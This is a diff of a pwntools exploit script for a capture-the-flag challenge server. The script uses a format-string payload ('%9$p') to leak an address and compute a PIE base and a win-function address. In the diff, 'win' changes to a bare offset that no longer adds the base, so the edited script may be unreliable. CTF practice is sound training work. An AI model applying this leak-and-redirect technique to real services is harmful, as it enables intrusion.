@@ -1,6 +1,5 @@
+#!/usr/bin/env python3
 from pwn import *
-
-#context.log_level = 'debug'
 
 p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")
 
@@ -14,8 +13,8 @@ p.sendlineafter(b'>>> ', b'%9$p')
 p.recvuntil(b'now: ')
 
 pie_addr = int(p.recvuntil(b'.')[:-1].decode(), 16)
-pie_base = pie_addr - 0x1380
-win = pie_base + 0x2139
+elf.address = pie_addr - 0x1380
+win = 0x2139
 
 # Stage 3
 p.sendlineafter(b'>>> ', b'3')
